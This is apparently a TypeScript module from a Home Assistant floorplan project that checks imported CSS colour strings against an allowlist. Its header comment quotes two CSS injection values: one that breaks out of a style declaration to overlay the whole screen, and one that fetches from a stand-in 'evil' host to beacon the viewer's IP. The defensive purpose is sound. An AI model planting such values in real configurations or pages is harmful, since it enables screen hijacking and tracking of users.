/**
 * Sanitise a user-supplied CSS colour before it is interpolated into a `style`
 * attribute.
 *
 * A floorplan config is shareable and importable, so its colour strings are
 * attacker-controlled. Lit does **not** escape `;` or `}` inside a style-attribute
 * expression, so a value like `red;position:fixed;inset:0;z-index:99999` breaks out
 * of its declaration and paints a full-viewport overlay over Home Assistant, and
 * `red;background-image:url(https://evil/x)` turns into a remote fetch that beacons
 * the viewer's IP. Neither is hypothetical — both were reproduced by parsing the
 * emitted DOM.
 *
 * This is an **allowlist**, deliberately. A denylist ("reject `;` `url(` …") invites
 * the one vector you forgot; here a value is dropped unless it is recognisably one
 * of the colour forms CSS actually uses. Every legitimate value in this codebase and
 * every colour a user would reasonably type passes; anything else returns
 * `undefined` so the caller falls back to its default.
 */

// #rgb #rgba #rrggbb #rrggbbaa
const HEX = /^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i;
// named keywords and CSS-wide keywords: red, transparent, currentColor, inherit…
const KEYWORD = /^[a-z]+$/i;
// rgb()/rgba()/hsl()/hsla() — only numbers, separators, %, /, and whitespace inside
const FUNC = /^(?:rgba?|hsla?)\([0-9.,%/\s]+\)$/i;
// var(--token) with an optional simple fallback that itself contains none of the
// characters an injection needs (`;` `{` `}` `(` `)`), e.g. var(--primary, #03a9f4)
const VAR = /^var\(\s*--[a-z0-9-]+\s*(?:,\s*[^;(){}]*)?\)$/i;

/**
 * The colour if it is safe to place in a `style` attribute, else `undefined`.
 * Whitespace is trimmed; empty and non-strings return `undefined`.
 */
export function cssColor(value: unknown): string | undefined {
  if (typeof value !== "string") return undefined;
  const v = value.trim();
  if (!v) return undefined;
  if (HEX.test(v) || KEYWORD.test(v) || FUNC.test(v) || VAR.test(v)) return v;
  return undefined;
}

/**
 * `cssColor(value) ?? fallback` — the value if safe, otherwise the (trusted,
 * caller-supplied) fallback. Use at every point a config colour reaches a style.
 */
export function cssColorOr(value: unknown, fallback: string): string {
  return cssColor(value) ?? fallback;
}
